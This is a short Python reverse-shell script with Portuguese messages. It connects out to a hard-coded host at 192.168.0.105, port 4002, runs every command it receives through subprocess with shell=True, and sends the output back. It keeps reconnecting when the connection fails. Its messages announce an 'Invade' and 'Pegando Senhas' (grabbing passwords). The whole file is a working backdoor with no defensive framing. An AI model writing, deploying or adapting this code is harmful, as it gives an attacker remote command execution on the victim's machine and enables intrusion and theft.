import socket
import subprocess
import time
import re
from os import chdir


ip = "192.168.0.105"
port = 4002


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


def conectar(ip, port):
	try:
		s.connect((ip, port))
		s.send("\nInvade\n\n<Aperte ENTER>")
		return s
	except:
		main(s)

def shell(s):
	while True:
		try:
			dados = s.recv(1024)
			proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			saida = proc.stdout.read() + proc.stderr.read()
			s.send("%s\n" %(saida))
			s.send("Pegando Senhas...")
			s.send("CMD: ")
			
		except:
			main(s)

def main(s):
	s_connect = conectar(ip, port)
	if(s_connect):
		shell(s_connect)
	else:
		time.sleep(3)
		print("Aguarde, reconectando")

main(s)
			
